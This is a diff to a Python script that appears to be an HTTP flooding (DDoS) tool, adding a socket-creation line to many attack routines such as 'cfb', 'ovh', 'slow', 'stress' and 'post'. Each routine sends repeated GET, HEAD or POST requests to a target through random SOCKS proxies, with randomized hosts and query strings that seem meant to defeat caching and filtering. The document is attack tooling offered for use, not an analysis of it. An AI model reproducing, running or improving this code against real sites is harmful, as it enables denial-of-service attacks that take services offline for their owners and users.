@@ -443,7 +443,7 @@ def dyn(event, socks_type):
     header = Headers("dyn")
     proxy = Choice(proxies).strip().split(":")
     get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + random_data() + "." + target + "\r\n"
-
+    s = socks.socksocket()
     request = get_host + header
     event.wait()
     while time.time() < timer:
@@ -475,6 +475,7 @@ def http(event, socks_type):
     get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -503,6 +504,7 @@ def capb(event, socks_type):
     get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -531,6 +533,7 @@ def ovh(event, socks_type):
     get_host = "HEAD " + path + "/" + str(Intn(1111111111, 9999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -558,6 +561,7 @@ def pps(event, socks_type):
     proxy = Choice(proxies).strip().split(":")
     request = Headers("pps")
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -588,6 +592,7 @@ def even(event, socks_type):
     get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -618,6 +623,7 @@ def brust(event, socks_type):
     get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -647,6 +653,7 @@ def cookie(event, socks_type):
     get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -676,6 +683,7 @@ def cfb(event, socks_type):
     get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -785,6 +793,7 @@ def head(event, socks_type):
     head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = head_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -814,6 +823,7 @@ def null(event, socks_type):
     head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = head_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -843,6 +853,7 @@ def gsb(event, socks_type):
     head_host = "HEAD " + path + "?q=" + str(Intn(000000000, 999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = head_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -887,6 +898,7 @@ def hit(event, timer):
 def cfbc(event, socks_type):
     request = Headers("cfb")
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -914,6 +926,7 @@ def post(event, socks_type):
     request = Headers("post")
     proxy = Choice(proxies).strip().split(":")
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -941,6 +954,7 @@ def stress(event, socks_type):
     request = Headers("stress")
     proxy = Choice(proxies).strip().split(":")
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -989,6 +1003,7 @@ def slow(conn, socks_type):
     get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
     header = Headers("get")
     request = get_host + header
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -1019,6 +1034,7 @@ def slow(conn, socks_type):
 def checking(lines, socks_type, ms):
     global nums, proxies
     proxy = lines.strip().split(":")
+    s = socks.socksocket()
     if len(proxy) != 2:
         proxies.remove(lines)
         return
